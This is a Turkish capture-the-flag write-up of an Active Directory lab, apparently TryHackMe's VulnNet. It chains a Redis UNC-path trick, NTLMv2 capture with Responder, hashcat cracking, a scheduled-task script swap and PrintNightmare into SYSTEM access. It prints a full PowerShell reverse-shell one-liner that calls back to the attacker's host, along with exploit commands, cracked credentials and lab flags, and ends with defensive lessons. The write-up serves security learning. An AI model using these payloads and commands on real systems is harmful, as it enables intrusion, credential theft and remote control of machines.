# VulnNet - Active Directory Sızma Testi Write-Up

Oct 25, 2026

## Özet

Hedefim bir Active Directory domain controller'ı olan **VULNNET-BC3TCK1** (domain: `vulnnet.local`) makinesiydi. İlk başta SMB ve RPC'yi null-session ile yokladım ama elime geçen bir şey olmadı. Derken hedefte **Redis (6379)** servisinin açıkta ve şifresiz durduğunu fark ettim. Redis'in `EVAL`/`dofile` komutunu kullanarak kendi elimdeki bir SMB paylaşımına UNC path üzerinden bağlanmasını tetikledim. Tam o sırada **Responder**'ı dinlemeye almıştım, hedef bana `VULNNET\enterprise-security` kullanıcısının **NTLMv2-SSP hash'ini** gönderdi. Hash'i **hashcat** + rockyou.txt ile saniyeler içinde kırdım. Elimdeki kimlikle yazılabilir **Enterprise-Share** paylaşımına girdim, orada zaten duran (muhtemelen zamanlanmış bir görevle tetiklenen) `PurgeIrrelevantData_1826.ps1` dosyasının içeriğini **reverse shell** payload'ımla değiştirdim. Görev tetiklenince `enterprise-security` yetkisiyle shell elime geçti ve **user flag**'i okudum. `whoami /priv` çıktısında `SeImpersonatePrivilege`'in açık olduğunu görünce **PrintNightmare (CVE-2021-1675)** ile yerel admin grubuna kendi kullanıcımı (`admin`) ekledim. Son olarak bu kimlikle **impacket-psexec** üzerinden **SYSTEM** oldum ve **root flag**'i de aldım.

## Hedef Bilgileri ve Recon

İşe her zamanki gibi tam kapsamlı bir Nmap taramasıyla başladım:

```
sudo nmap -sS -sV -sC -T4 -Pn -A 10.113.185.137
```

**Açık portlar:**

| Port | Servis | Not |
| --- | --- | --- |
| 53/tcp | domain | Simple DNS Plus |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | SMB |
| 464/tcp | kpasswd5 | Kerberos password change |

OS tahmini **Windows Server 2019 / 10** çıktı. `smb2-security-mode` kısmında mesaj imzalamanın (SMB signing) zorunlu olduğunu gördüm, yani klasik relay saldırılarını baştan unutabilirdim. Açık portlara bakınca (53, 135, 139, 445, 464) zaten hedefin bir **Active Directory Domain Controller** olduğu belliydi.

![Nmap taraması - açık portlar ve OS tespiti](assets/img/vulnnet-ad-writeup/01-nmap-tarama.png)

## SMB/RPC Null Session ile İlk Keşif

İlk refleks her zaman null-session denemek. SMB ve RPC'ye kimlik doğrulamasız bağlanmayı denedim. SMB session üzerinden domain bilgisini çekebildim ama RPC ve guest erişimi kapıdan geri çevirdi:

- NetBIOS computer name: `VULNNET-BC3TCK1`
- DNS domain: `vulnnet.local`
- FQDN: `VULNNET-BC3TCK1HNQ.vulnnet.local`
- RPC null/guest session: `STATUS_LOGON_FAILURE`

![SMB dialect/domain bilgisi ve RPC null session kontrolü](assets/img/vulnnet-ad-writeup/02-smb-rpc-domain-bilgisi.png)

`smbclient` ile anonim login'i geçtim ama paylaşımları listeleyemedim; `rpcclient` de null session ile bağlandı ama `enumdomusers` gibi komutlarda hep `NT_STATUS_ACCESS_DENIED` yedim:

![smbclient anonim login denemesi ve rpcclient null session bağlantısı](assets/img/vulnnet-ad-writeup/03-smbclient-rpcclient-anonim.png)

![rpcclient null session ile komut denemeleri](assets/img/vulnnet-ad-writeup/04-rpcclient-enumdomusers-denied.png)

Son çare olarak **NetExec (nxc)**'i `spider_plus` modülüyle denedim. Hedefin SMBv1'i kapatmış, signing'i açmış ve null auth'a izin verdiğini doğruladım ama paylaşım tarafında yine `STATUS_ACCESS_DENIED` ile karşılaştım:

```
netexec smb 10.113.185.137 -u '' -p '' -M spider_plus
```

![NetExec spider_plus ile paylaşım tarama denemesi](assets/img/vulnnet-ad-writeup/05-netexec-spider-plus.png)

Bu noktada SMB/RPC'den bir şey çıkmayacağını anladım, başka bir yere bakmam gerekiyordu.

## Redis Servisinin Keşfi ve Yetkisiz Erişim

Portları biraz daha geniş taratınca standart AD portlarının dışında **9389/tcp (mc-nmf)** açık çıktı. Bu port Active Directory Web Services (ADWS)'e ait; AD PowerShell modülü ve ADAC'ın LDAP yerine SOAP üzerinden dizine eriştiği alternatif bir kanal. Bunu exploit etmedim, sadece hedefin DC olduğunu teyit etmek için not aldım:

![9389/tcp açık port (ADWS)](assets/img/vulnnet-ad-writeup/06-port-9389-mc-nmf.png)

![Port 9389 / ADWS hakkında araştırma (pentestpad.com)](assets/img/vulnnet-ad-writeup/07-adws-arastirma-pentestpad.png)

Asıl ilgimi çeken, **6379/tcp (Redis)**'in açık ve kimlik doğrulamasız olmasıydı. `redis-cli` ile bağlanıp `INFO` çektim:

```
redis-cli -h 10.113.185.137
```

Redis Windows üzerinde, sürüm 2.8.2402, authsız ve standalone modda çalışıyordu:

![redis-cli INFO çıktısı](assets/img/vulnnet-ad-writeup/08-redis-cli-info.png)

Şifresiz bir Redis gördüğümde aklıma hemen `CONFIG SET`/`SAVE` ile dosya yazma ya da `EVAL` ile Lua çalıştırma geldi. Burada `EVAL`'i kullanıp kendi kontrolümdeki bir SMB paylaşımına UNC path ile gitmesini sağlamayı denedim.

## Redis UNC Path Injection ile NTLM Hash Çalma (Responder) ve Hashcat ile Kırma

`EVAL` komutu üzerinden `dofile()` ile kendi makinemdeki (kali) SMB paylaşımında duran bir Lua dosyasını çalıştırmaya çalıştım:

```
eval "dofile('\\\\192.168.131.130\\share\\test.lua')" 0
```

İlk denemede yol formatını yanlış yazmışım, `Invalid argument` hatası aldım. Escape karakterlerini düzeltip tekrar attığımda hedef gerçekten paylaşımıma **ulaşmaya çalıştı** ve `Permission denied` döndü — yani hedef benim UNC path'ime doğru bir SMB bağlantısı başlatmıştı, istediğim buydu:

![Redis EVAL/dofile ile UNC path'e erişim denemesi](assets/img/vulnnet-ad-writeup/09-redis-eval-dofile.png)

Hedef kendiliğinden bana doğru SMB açıyorsa, bu klasik bir **NTLM hash yakalama** fırsatı demek. Hemen **Responder**'ı `tun0` üzerinde dinlemeye aldım (SMB server dahil gerekli poisoner'lar açık):

```
sudo responder -I tun0 -dwv
```

![Responder'ın tun0 üzerinde dinlemeye başlaması](assets/img/vulnnet-ad-writeup/10-responder-baslatma.png)

Redis'in UNC path denemesi SMB auth'u tetikledi ve Responder bana `VULNNET\enterprise-security` hesabının **NTLMv2-SSP** handshake'ini getirdi:

![Responder ile yakalanan NTLMv2-SSP hash](assets/img/vulnnet-ad-writeup/11-ntlmv2-hash-yakalandi.png)

Hash'i offline olarak **hashcat** (mode 5600 – NetNTLMv2) ile `rockyou.txt` kullanarak kırdım, birkaç saniye bile sürmedi:

```
hashcat -m 5600 enterprise-security.hash /usr/share/wordlists/rockyou.txt
```

![Hashcat ile hash'in kırılması](assets/img/vulnnet-ad-writeup/12-hashcat-kirildi.png)

Sonuçta elimde geçerli bir kimlik vardı: **`VULNNET\enterprise-security`** / kırılan parola (`sand_0873959498`).

## Çalınan Kimlik Bilgisiyle SMB Erişimi ve Yazılabilir Share Keşfi

Bu kimlikle (`enterprise-security` / `sand_0873959498`) SMB'ye tekrar bağlandım, bu sefer paylaşımlar önüme açıldı:

```
smbclient -L //10.113.185.137 -U "enterprise-security" --option='client min protocol=SMB2'
```

| Paylaşım | Tip | Açıklama |
| --- | --- | --- |
| ADMIN$ | Disk | Remote Admin |
| C$ | Disk | Default share |
| **Enterprise-Share** | Disk | — |
| IPC$ | IPC | Remote IPC |
| NETLOGON | Disk | Logon server share |
| SYSVOL | Disk | Logon server share |

![smbclient ile enterprise-security kimliğiyle paylaşım listesi](assets/img/vulnnet-ad-writeup/13-smbclient-paylasim-listesi.png)

`Enterprise-Share` gözüme hemen takıldı, çünkü standart bir domain paylaşımı değil. İçine girdiğimde 2021 tarihli, 69 byte'lık `PurgeIrrelevantData_1826.ps1` diye bir script buldum. İsminden ("gereksiz veriyi temizle") muhtemelen periyodik çalışan bir **zamanlanmış görev** tarafından tetiklendiğini düşündüm:

![Enterprise-Share içeriği - mevcut PurgeIrrelevantData_1826.ps1 dosyası](assets/img/vulnnet-ad-writeup/14-enterprise-share-icerigi.png)

Bu paylaşım `enterprise-security` için **yazılabilirdi**, yani script'in içeriğini değiştirip görev tetiklendiğinde kendi kodumu çalıştırtabilirdim.

## Zararlı PowerShell Script Yükleme, Reverse Shell ve User Flag

Kendi tarafımda, bana (`192.168.131.130:4444`) bağlanan bir PowerShell reverse-shell one-liner'ı hazırladım ve `PurgeIrrelevantData_1826.ps1` olarak kaydettim:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.131.130',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![Yerelde hazırladığım reverse shell script içeriği](assets/img/vulnnet-ad-writeup/15-reverse-shell-script-icerigi.png)

Bu scripti `Enterprise-Share`'deki orijinal dosyanın üzerine `smbclient` ile `put` ettim (dosya boyutu 69 byte'tan 507 byte'a çıktı, yani değişti):

```
smb: \> put PurgeIrrelevantData_1826.ps1
```

![smbclient ile script'in Enterprise-Share'e yüklenmesi](assets/img/vulnnet-ad-writeup/16-script-yukleme-smbclient.png)

Sonra netcat listener'ımı açıp zamanlanmış görevin scripti tetiklemesini bekledim. Çok geçmeden bağlantı geldi, `enterprise-security` yetkisiyle interaktif bir PowerShell shell'e sahiptim:

```
nc -lvnp 4444
```

![nc listener'a gelen reverse shell bağlantısı - whoami: vulnnet\enterprise-security](assets/img/vulnnet-ad-writeup/17-nc-listener-baglanti.png)

Shell'den masaüstündeki `user.txt`'i okuyup flag'i aldım:

```
THM{3eb176aee96432d5b100bc93580b291e}
```

![user.txt flag'inin okunması](assets/img/vulnnet-ad-writeup/18-user-flag.png)

## Privilege Escalation: PrintNightmare (CVE-2021-1675)

Yetki yükseltmeye geçmeden önce elimdeki ayrıcalıklara baktım:

```
whoami /priv
```

`SeImpersonatePrivilege` **Enabled** çıktı — bu, Potato ailesi ya da spool servisine dayalı exploit'ler için klasik bir işaret:

![whoami /priv çıktısı - SeImpersonatePrivilege etkin](assets/img/vulnnet-ad-writeup/19-whoami-priv.png)

Masaüstünde hazır duran `nightmare.ps1` modülünü import edip **Print Spooler**'daki sürücüleri listeledim. Listede meşru sürücülerin arasında, ismiyle resmen kendini ele veren **"Totally Not Malicious"** diye bir sürücü vardı — PrintNightmare (CVE-2021-1675) için lab ortamında bilerek bırakılmış, zafiyetli bir driver. `cve-2021-1675.ps1` modülünü import edip `Invoke-Nightmare`'i bu sürücü adıyla, yeni bir yerel admin hesabı oluşturacak şekilde çalıştırdım:

```powershell
Import-Module C:\Users\enterprise-security\Desktop\nightmare.ps1
Set-ExecutionPolicy Bypass -Scope Process
Get-PrinterDriver
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -DriverName "Totally Not Malicious" -NewUser "admin" -NewPassword "P@ssw0rd123"
```

![PrintNightmare (CVE-2021-1675) exploit'inin çalıştırılması - Invoke-Nightmare](assets/img/vulnnet-ad-writeup/20-invoke-nightmare.png)

Exploit SYSTEM bağlamında çalıştığı için oluşturduğum `admin` kullanıcısı direkt yerel **Administrators** grubuna düştü. Bunu `net localgroup administrators` ile doğruladım:

![net localgroup administrators - admin kullanıcısının üyeliğinin doğrulanması](assets/img/vulnnet-ad-writeup/21-localgroup-admins-dogrulama.png)

Artık elimde `admin` / `P@ssw0rd123` ile yerel yönetici erişimi vardı.

## Yeni Admin Hesabıyla PsExec / SYSTEM Erişimi ve Root Flag

Bu kimlikle (`admin` / `P@ssw0rd123`) **impacket-psexec** kullanarak hedefte SYSTEM yetkili bir shell aldım:

```
impacket-psexec VULNNET.local/admin:P@ssw0rd123@10.114.131.165
```

Araç `ADMIN$` paylaşımına yazabildiğini görünce bir servis ikili dosyası yükledi, servisi oluşturup başlattı ve bana interaktif `cmd.exe` verdi:

![impacket-psexec ile admin kimliğiyle SYSTEM erişimi](assets/img/vulnnet-ad-writeup/22-impacket-psexec-system.png)

> **Not:** Bu adımda hedef IP (`10.114.131.165`) önceki adımlarda kullandığım IP'den (`10.113.185.137`) farklı çıktı; bu lab ortamının oturumlar arasında yeniden dağıtılmasından (redeploy) kaynaklanıyor, saldırı zincirini bozan bir şey değil.

Son olarak Administrator masaüstündeki `system.txt`'i okuyup zinciri kapattım:

```
THM{d540c0645975900e5bb9167aa431fc9b}
```

![system.txt flag'inin okunması](assets/img/vulnnet-ad-writeup/23-system-flag.png)

## Akış Şeması Özeti ve Alınan Güvenlik Dersleri

**Zincir özetle:** Nmap recon → SMB/RPC null session (sonuçsuz) → Redis'in şifresiz olduğunu bulma → Redis `EVAL`/`dofile` ile kendi SMB paylaşımıma UNC path üzerinden erişim denemesi → Responder ile NTLMv2 hash'in yakalanması → Hashcat ile hash'in kırılması → O kimlikle SMB'ye giriş ve yazılabilir `Enterprise-Share`'in bulunması → Paylaşımdaki scripti reverse shell ile değiştirip zamanlanmış görevle tetikleme → User flag → `whoami /priv` ile `SeImpersonatePrivilege` tespiti → PrintNightmare (CVE-2021-1675) ile yeni yerel admin açma → PsExec ile SYSTEM → Root flag.

**Aldığım dersler:**

- Redis gibi servisler internete veya iç ağa şifresiz açık bırakılmamalı.
- Sunucuların dışarıya keyfi SMB bağlantısı açabilmesi (outbound 445/139) engellenmeli; bu tek başına NTLM hash çalma saldırılarının çoğunu keser.
- rockyou.txt ile saniyeler içinde kırılabilen zayıf parolalar kullanılmamalı, parola politikası sıkılaştırılmalı.
- Düşük yetkili hesapların yazabildiği paylaşımlardaki dosyalar, ayrıcalıklı bir zamanlanmış görev tarafından çalıştırılmamalı.
- Domain controller'da kullanılmıyorsa Print Spooler kapatılmalı; kullanılıyorsa PrintNightmare yamaları mutlaka uygulanmalı.
- Yeni yerel yönetici oluşturma ve PsExec gibi araçların kullanımı EDR/SIEM ile izlenmeli.
